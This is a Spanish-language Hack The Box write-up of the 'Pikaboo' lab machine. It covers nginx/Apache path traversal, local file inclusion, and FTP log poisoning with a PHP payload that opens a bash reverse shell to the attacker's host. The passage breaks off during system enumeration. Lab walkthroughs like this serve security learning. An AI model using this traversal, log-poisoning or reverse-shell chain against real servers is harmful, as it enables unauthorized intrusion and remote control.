@@ -1,0 +1,827 @@
+<!doctype html><html lang=es>
+<head>
+<title>Pikaboo | 7Rocky</title>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=description content="Hack The Box. Linux. Máquina difícil. Esta máquina utiliza nginx y Apache como servidores web con una mala configuración que deriva en navegación de directorios y posteriormente en inclusión de archivos locales. Existen credenciales de FTP en LDAP y una tarea cron que es vulnerable a inyección de comandos. Para comprometer esta máquina se necesita enumeración web, conocimiento sobre nginx y LDAP, técnicas de explotación de inclusión de archivos y trucos de inyección de comandos. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero">
+<meta name=robots content="index, follow">
+<meta name=image content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
+<meta name=author content="7Rocky">
+<meta property="og:title" content="Pikaboo">
+<meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina utiliza nginx y Apache como servidores web con una mala configuración que deriva en navegación de directorios y posteriormente en inclusión de archivos locales. Existen credenciales de FTP en LDAP y una tarea cron que es vulnerable a inyección de comandos. Para comprometer esta máquina se necesita enumeración web, conocimiento sobre nginx y LDAP, técnicas de explotación de inclusión de archivos y trucos de inyección de comandos. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7rocky.github.io/htb/pikaboo/"><meta property="article:section" content="htb">
+<meta property="article:published_time" content="2021-12-04T00:00:00+01:00">
+<meta property="article:modified_time" content="2021-12-04T00:00:00+01:00">
+<meta property="og:image" content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
+<meta property="og:author" content="7Rocky">
+<meta itemprop=name content="Pikaboo">
+<meta itemprop=description content="Hack The Box. Linux. Máquina difícil. Esta máquina utiliza nginx y Apache como servidores web con una mala configuración que deriva en navegación de directorios y posteriormente en inclusión de archivos locales. Existen credenciales de FTP en LDAP y una tarea cron que es vulnerable a inyección de comandos. Para comprometer esta máquina se necesita enumeración web, conocimiento sobre nginx y LDAP, técnicas de explotación de inclusión de archivos y trucos de inyección de comandos. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero"><meta itemprop=datePublished content="2021-12-04T00:00:00+01:00">
+<meta itemprop=dateModified content="2021-12-04T00:00:00+01:00">
+<meta itemprop=wordCount content="3189">
+<meta itemprop=keywords content="ftp,perl,ldap,cronjob,command-injection,log-poisoning,lfi,directory-path-traversal,">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Pikaboo">
+<meta name=twitter:description content="Hack The Box. Linux. Máquina difícil. Esta máquina utiliza nginx y Apache como servidores web con una mala configuración que deriva en navegación de directorios y posteriormente en inclusión de archivos locales. Existen credenciales de FTP en LDAP y una tarea cron que es vulnerable a inyección de comandos. Para comprometer esta máquina se necesita enumeración web, conocimiento sobre nginx y LDAP, técnicas de explotación de inclusión de archivos y trucos de inyección de comandos. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero">
+<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
+<meta name=twitter:author content="7Rocky">
+<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
+<link rel=stylesheet href=/css/style.css>
+<link rel=stylesheet href=/css/monokai-sublime.min.css>
+<link rel=stylesheet href=/css/main.css>
+<script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
+<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
+<script src=/js/main.js></script>
+<div style=display:none>
+$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$
+</div>
+</head>
+<body class=ma0>
+<header>
+<div class=bg-black>
+<nav class="pv3 ph3 ph4-ns" role=navigation>
+<div class="flex-l justify-between items-center center">
+<a href=/ class="f3 fw2 hover-white no-underline white-90 dib">7Rocky</a>
+<div class="flex-l items-center">
+<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/pikaboo/>
+<img alt=en src=/images/en.png>
+</a>
+<ul class="pl0 ml3 mr3">
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/htb/ title>HTB</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/imc/ title>IMC</a>
+</li>
+</ul>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</nav>
+</div>
+</header>
+<main class=pb7 role=main>
+<article class="flex-l flex-wrap justify-between mw8 center ph3">
+<header class="mt4 w-100">
+<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
+<div id=sharing class=mt3>
+<a href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/pikaboo/" class="facebook no-underline" aria-label="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a>
+<a href="https://twitter.com/share?url=https://7rocky.github.io/htb/pikaboo/&text=Pikaboo" class="twitter no-underline" aria-label="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/pikaboo/&title=Pikaboo" class="linkedin no-underline" aria-label="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+</div>
+<h1 class="f1 mt3 mb1">Pikaboo</h1>
+<time class="f6 mv4 dib tracked" datetime=2021-12-04T00:00:00+01:00>04 / 12 / 2021</time>
+</header>
+<div class=htb-image>
+<img alt=Pikaboo src=/images/HTB/Pikaboo/Pikaboo.png>
+</div>
+<ul class="nested-links tags">
+<li class=list>
+<a href=/tags/ftp class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">FTP</a>
+</li>
+<li class=list>
+<a href=/tags/perl class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Perl</a>
+</li>
+<li class=list>
+<a href=/tags/ldap class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">LDAP</a>
+</li>
+<li class=list>
+<a href=/tags/cronjob class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Tareas Cron</a>
+</li>
+<li class=list>
+<a href=/tags/command-injection class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Inyección de Comandos</a>
+</li>
+<li class=list>
+<a href=/tags/log-poisoning class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Envenenamiento de Logs</a>
+</li>
+<li class=list>
+<a href=/tags/lfi class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Inclusión de Archivos Locales</a>
+</li>
+<li class=list>
+<a href=/tags/directory-path-traversal class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Ruta de Directorio Transversal</a>
+</li>
+</ul>
+<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
+<p class="f5 b mb3">Contenidos de este write-up</p>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#port-scanning>Port scanning</a></li>
+<li><a href=#enumeración-web>Enumeración web</a></li>
+<li><a href=#realizando-navegación-de-directorios>Realizando navegación de directorios</a></li>
+<li><a href=#encontrando-un-lfi>Encontrando un LFI</a></li>
+<li><a href=#envenenamiento-del-_log_-de-ftp>Envenenamiento del <em>log</em> de FTP</a></li>
+<li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li>
+<li><a href=#enumeración-por-ldap>Enumeración por LDAP</a></li>
+<li><a href=#encontrando-una-tarea-cron>Encontrando una tarea Cron</a></li>
+<li><a href=#explotando-una-inyección-de-comandos>Explotando una inyección de comandos</a></li>
+</ul>
+</nav>
+</div>
+</aside>
+<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
+<li>
+<strong>SO</strong>: Linux
+</li>
+<li>
+<strong>Dificultad</strong>: Difícil
+</li>
+<li>
+<strong>Dirección IP</strong>: 10.10.10.249
+</li>
+<li>
+<strong>Fecha</strong>: 17 / 07 / 2021
+</li>
+</ul>
+<h2 id=port-scanning>Port scanning</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.249 -p 21,22,80
+Nmap scan report for 10.10.10.249
+Host is up (0.045s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
+|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
+|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Pikaboo
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 10.16 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 21 (FTP), 22 (SSH) y 80 (HTTP).</p>
+<h2 id=enumeración-web>Enumeración web</h2>
+<p>Si entramos a <code>http://10.10.10.249</code>, veremos la siguiente página web:</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-web.png alt="Pikaboo web"></p>
+<p>Podemos ver también una &ldquo;Pokatdex&rdquo;:</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-pokatdex.png alt="Pikaboo Pokatdex"></p>
+<p>Parece que existe un panel de administración, pero no podemos entrar porque no tenemos credenciales (al acceder a <code>/admin</code>, nos solicita credentiales mediante HTTP <em>Basic Authentication</em>):</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-403.png alt="Pikaboo Admin 403"></p>
+<p>Utilizando <code>gobuster</code>, podemos listar algunas rutas del servidor web y ver algo extraño:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -r -u http://10.10.10.249
+/images               (Status: 403) [Size: 274]
+/admin                (Status: 401) [Size: 456]
+/administration       (Status: 401) [Size: 456]
+/administrator        (Status: 401) [Size: 456]
+/administr8           (Status: 401) [Size: 456]
+/administrative       (Status: 401) [Size: 456]
+/administratie        (Status: 401) [Size: 456]
+/admins               (Status: 401) [Size: 456]
+/admin_images         (Status: 401) [Size: 456]
+/administrivia        (Status: 401) [Size: 456]
+/administrative-law   (Status: 401) [Size: 456]
+/administrators       (Status: 401) [Size: 456]
+/admin1               (Status: 401) [Size: 456]
+/administer           (Status: 401) [Size: 456]
+/admin3_gtpointup     (Status: 401) [Size: 456]
+/admin_hp             (Status: 401) [Size: 456]
+/admin25              (Status: 401) [Size: 456]
+/admin02              (Status: 401) [Size: 456]
+/administrationinfo   (Status: 401) [Size: 456]
+/admin_thumb          (Status: 401) [Size: 456]
+/admin_full           (Status: 401) [Size: 456]
+/admin_functions      (Status: 401) [Size: 456]
+/admin2               (Status: 401) [Size: 456]
+/adminhelp            (Status: 401) [Size: 456]
+/administratoraccounts (Status: 401) [Size: 456]
+/adminoffice          (Status: 401) [Size: 456]
+/administracja        (Status: 401) [Size: 456]
+</code></pre></div><p>Como se puede observar, el servidor está solicitando autenticación cuando la URL comienza por <code>/admin</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl http://10.10.10.249/adminasdf
+&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;401 Unauthorized&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Unauthorized&lt;/h1&gt;
+&lt;p&gt;This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn&#39;t understand how to supply
+the credentials required.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div><p>Además, vemos que la respuesta del servidor es de Apache/2.4.38 en el puerto 81. La salida de <code>nmap</code> inicial mostraba que el servidor web en el puerto 80 es nginx.</p>
+<p>Las imágenes que hay en la página web son servidas por nginx. Esto se puede ver mirando la respuesta de error del servidor:</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-image-404.png alt="Pikaboo nginx error"></p>
+<h2 id=realizando-navegación-de-directorios>Realizando navegación de directorios</h2>
+<p>Es posible que existan malas configuraciones entre estos servidores web, y probablemente estén relacionadas con la ruta <code>/admin</code>. Podemos aplicar <em>fuzzing</em> para encontrar una navegación de directorios, y vemos lo siguiente:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../FUZZ&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt
+admin                   [Status: 401, Size:  456, Words:  42, Lines:  15]
+javascript              [Status: 301, Size:  314, Words:  20, Lines:  10]
+                        [Status: 403, Size:  274, Words:  20, Lines:  10]
+server-status           [Status: 200, Size: 5815, Words: 269, Lines: 114]
+</code></pre></div><p>Se puede ver que es posible navegar entre directorios. Sin embargo, no tenemos permiso para acceder a <code>/admin../admin</code> porque no tenemos credenciales.</p>
+<p>Podemos comprobar si hay más directorios que empiezen por <code>admin</code>. Por ejemplo:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../adminFUZZ&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt
+                        [Status: 401, Size: 456, Words: 42, Lines: 15]
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../admin_FUZZ&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt
+staging                 [Status: 301, Size: 317, Words: 20, Lines: 10]
+</code></pre></div><p>Y obtenemos que existe un directorio llamado <code>admin_staging</code>, y además es accesible.</p>
+<p>Ahora podemos entrar en <code>http://10.10.10.249/admin../admin_staging/</code> y saltarnos la autenticación:</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-admin_staging.png alt="Pikaboo admin_staging"></p>
+<h2 id=encontrando-un-lfi>Encontrando un LFI</h2>
+<p>Si inspeccionamos la página, vemos que el servidor está incluyendo archivos PHP mediante un parámetro GET, como se muestra:</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-user.png alt="Pikaboo user"></p>
+<p>Podemos aplicar <em>fuzzing</em> con <code>ffuf</code> para buscar archivos disponibles:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ.php&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -fw <span style=color:#ae81ff>3272</span>
+info                    [Status: 200, Size: 86990, Words:  6716, Lines: 1170]
+user                    [Status: 200, Size: 24978, Words:  7266, Lines:  578]
+index                   [Status: 200, Size:     0, Words:     1, Lines:    1]
+dashboard               [Status: 200, Size: 40555, Words: 15297, Lines:  883]
+tables                  [Status: 200, Size: 29131, Words: 11707, Lines:  744]
+typography              [Status: 200, Size: 24923, Words:  6989, Lines:  567]
+</code></pre></div><p>Al descargar estos archivos, podemos notar que el código se está interpretando. Esto es un signo de que la página es vulnerable a inclusión de archivos locales (LFI).</p>
+<p>Para poder leer el código fuente de los archivos PHP, podemos utilizar un <em>wrapper</em> PHP (por ejemplo, codificar el contenido en Base64 y decodificarlo después). Se puede probar con <code>admin_staging/index.php</code>:</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-wrapper.png alt="Pikaboo wrapper"></p>
+<p>Si cogemos este archivo codificado en Base64 y lo decodificamos, veremos que hay un fragmento de código PHP que muestra cómo se realiza la inclusión de archivos:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>])) {
+    <span style=color:#66d9ef>include</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>]);
+  } <span style=color:#66d9ef>else</span> {
+    <span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#39;dashboard.php&#39;</span>);
+  }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>Sin embargo, el servidor solamente permite incluir algunos archivos (aparte de los archivos PHP vistos anteriormente). Esto se muestra en el archivo <code>admin_staging/info.php</code>, que es un <code>phpinfo()</code>, y se indica que solamente se pueden incluir archivos del directorio <code>/var/</code> del servidor.</p>
+<h2 id=envenenamiento-del-_log_-de-ftp>Envenenamiento del <em>log</em> de FTP</h2>
+<p>Teniendo en cuenta que hay un servidor FTP, la idea es realizar un envenenamiento del archivo de <em>log</em> de FTP. Este archivo (<code>/var/log/vsftpd.log</code>) es legible:</p>
+<p><img src=../../../images/HTB/Pikaboo/Pikaboo-log.png alt="Pikaboo log"></p>
+<p>La técnica consiste en insertar código PHP en el archivo de <em>log</em>, de manera que al ser incluido en la página web, el código PHP se ejecuta.</p>
+<p>Mirando al archivo de <em>log</em> de FTP, vemos que el nombre de usuario se refleja, por lo que será en este campo donde habrá que incluir el código PHP para obtener <em>Remote Code Execution</em> (RCE).</p>
+<p>A continuación, podemos utilizar un comando de sistema para obtener una <em>reverse shell</em> desde la máquina (es necesario escribir algo en la contraseña para que funcione):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ftp 10.10.10.249
+Connected to 10.10.10.249.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.249:rocky): &lt;?php system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;&#34;); ?&gt;
+331 Please specify the password.
+Password:
+530 Login incorrect.
+ftp: Login failed.
+ftp&gt; quit
+221 Goodbye.
+</code></pre></div><p>Ahora que el <em>log</em> de FTP está envenenado, podemos ejecutarlo utilizando el LFI. Desde <code>nc</code>, obtenemos acceso a la máquina:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl <span style=color:#e6db74>&#39;http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log&#39;</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.249.
+Ncat: Connection from 10.10.10.249:60272.
+bash: cannot set terminal process group (664): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@pikaboo:/var/www/html/admin_staging$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@pikaboo:/var/www/html/admin_staging$ ^Z
+zsh: suspended  ncat -nlvp 4444
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@pikaboo:/var/www/html/admin_staging$ export TERM=xterm
+www-data@pikaboo:/var/www/html/admin_staging$ export SHELL=bash
+www-data@pikaboo:/var/www/html/admin_staging$ stty rows 50 columns 158
+</code></pre></div><h2 id=enumeración-del-sistema>Enumeración del sistema</h2>
+<p>En este punto, podemos leer la <em>flag</em> <code>user.txt</code> como usuario <code>www-data</code>, aunque está en el directorio personal de <code>pwnmeow</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home
+total 560
+drwxr-xr-x  2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow
+www-data@pikaboo:/var/www/html/admin_staging$ ls -la /home/pwnmeow/
+total 580
+drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 .
+drwxr-xr-x 3 root    root       4096 May 10 10:26 ..
+lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout
+-rw-r--r-- 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc
+-rw-r--r-- 1 pwnmeow pwnmeow     807 May 10 10:26 .profile
